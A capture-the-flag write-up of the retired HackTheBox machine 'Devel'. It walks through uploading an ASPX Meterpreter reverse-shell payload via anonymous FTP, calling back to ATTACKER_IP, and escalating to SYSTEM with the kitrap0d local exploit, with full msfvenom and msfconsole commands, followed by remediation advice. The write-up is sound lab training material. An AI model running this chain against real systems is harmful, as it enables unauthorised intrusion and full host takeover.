Devel — Anonymous FTP → ASPX webshell → Meterpreter → Local exploit → SYSTEM (Lab)

Date: 2025-10-19
TL;DR: Anonymous FTP allowed uploading an ASPX webshell; I uploaded a Meterpreter ASPX payload, triggered it via HTTP to get a session, enumerated the host, ran a local exploit suggester and used a 32-bit local exploit to escalate to NT AUTHORITY\SYSTEM. All testing performed on a retired HTB lab VM in an isolated environment. PoC artifacts in this writeup are sanitized.

Scope & permission

This work was performed on a retired HackTheBox machine in a lab I control. All commands and artifacts in this document are sanitized for public release. Do not run exploit code against third-party or production systems.

Environment (sanitized)

Target: TARGET_IP (devel)

Discovered services (sanitized):

FTP — anonymous allowed (Microsoft ftpd)

HTTP — Microsoft IIS 7.5 (IIS7)

OS: Windows (32-bit / x86) based on sysinfo from Meterpreter.



Tools used

nmap, ftp (or any FTP client), msfvenom (payload generation), msfconsole (multi/handler & local exploit), a web browser / curl to trigger uploaded webshell, netstat/ss, Meterpreter post modules (local_exploit_suggester), and common shell utilities. (All steps were performed in an isolated lab.)

Chain summary (short)

Port scan → anonymous FTP discovered.

Upload ASPX payload (Meterpreter) via anonymous FTP.

Trigger the ASPX payload through IIS to get a Meterpreter session.

Use Meterpreter to enumerate and confirm x86 (32-bit) target.

Run post/multi/recon/local_exploit_suggester to find suitable local exploits.

Launch a 32-bit local exploit (kitrap0d / MS10-015 variant in-lab) to spawn a SYSTEM session.

Grab user and root flags from the appropriate Desktop folders.

Detailed, reproducible (sanitized) steps
1) Initial scan

nmap -sCV -T4 --open -oA recon --stats-every 5s TARGET_IP

Observed (sanitized):

FTP (21) — Microsoft ftpd — anonymous FTP login allowed

HTTP (80) — Microsoft-IIS/7.5 (IIS7)

2) Confirm anonymous FTP and list files

ftp TARGET_IP
# username: anonymous
# password: (blank)
# ls

Noted aspnet_client/ (empty), iisstart.htm, and welcome.png — nothing immediately interesting in pages, but anonymous write/upload was possible.

3) Generate an ASPX Meterpreter payload (lab-only)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f aspx > devel.aspx

Notes: On restricted networks, ports <1024 may require privileges — choose a port you can receive on.

4) Upload the ASPX to the webroot via anonymous FTP

ftp TARGET_IP
# login as anonymous
put devel.aspx
# confirm the file is present (e.g., in IIS webroot)

If the FTP root maps to the IIS webroot, the uploaded devel.aspx becomes web-accessible (e.g., http://TARGET_IP/devel.aspx).

5) Set up a handler and trigger the webshell

Start a handler on your attacking host (msfconsole example):

# In msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT LPORT
set ExitOnSession false
exploit -j

Trigger the webshell by browsing to the uploaded ASPX (or curl http://TARGET_IP/devel.aspx) — this should call back to your handler and create a Meterpreter session.

6) Interact with the Meterpreter session

# In msfconsole
sessions -i <id>
# Meterpreter prompt
sysinfo # confirm OS and architecture (Observed x86)
pwd # observed /windows/system32/inetsrv

From this session, I found myself running in c:\windows\system32\inetsrv and sysinfo reported 32-bit (x86), so further local exploits must match that arch.

7) Upload / move to writable folders (if needed)

Often the web context allows writing to C:\Windows\Temp or other temp locations. I used such a path to stage additional binaries/exploits as required.

8) Enumerate and suggest local exploits

Use Meterpreter’s local exploit suggester to find potential privilege escalation vectors:

run post/multi/recon/local_exploit_suggester

This returns a prioritized list of local exploits that may work on the target given OS/patch level/architecture.

9) Launch a 32-bit local exploit (lab-only)

Using msfconsole I executed the exploit against the Meterpreter session:

# in msfconsole
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <meterpreter-session-id>
set LHOST ATTACKER_IP
set LPORT LPORT
set PAYLOAD windows/meterpreter/reverse_tcp
exploit -j

The exploit succeeded and a new background session (with SYSTEM privileges) was created.

Important: choose a local exploit appropriate to the discovered OS, arch, and patch level.

10) Verify SYSTEM and capture flags

# switch to the new session (e.g., session 4)
sessions -i <new-session-id>
getuid # shows NT AUTHORITY\SYSTEM
# then retrieve flags
cd C:\Users\<user>\Desktop
type user.txt
cd C:\Users\Administrator\Desktop
type root.txt

Impact

Full host compromise: anonymous FTP + writable webroot allowed remote payload upload → web-executable payload → remote shell → local exploit → SYSTEM.

On real systems this chain would allow attackers to access or exfiltrate sensitive data, create persistence, and move laterally.



Remediation (prioritized)

Disable anonymous FTP or restrict it to an isolated, non-webroot directory. Anonymous write access to a directory mapped to the webroot is a critical misconfiguration.

Harden IIS/FTP mapping: ensure uploaded files cannot be served/executed as code (deny execute permission on upload directories). Store user uploads outside the web-executable tree and serve them via safe proxies or with content-type checks.

Patch Windows and apply vendor fixes: keep systems up to date; the used local exploit targets known, patchable vulnerabilities.

Least privilege & segmentation: ensure web services run with minimal privileges and that local services do not run as SYSTEM unless strictly necessary.

Monitoring & alerting: alert on new files in webroot, anomalous FTP uploads, new setuid-like changes, or meterpreter-like callbacks (IDS/IPS).

File integrity & upload validation: validate uploads, restrict allowed extensions, and strip/scan for web-executable content.

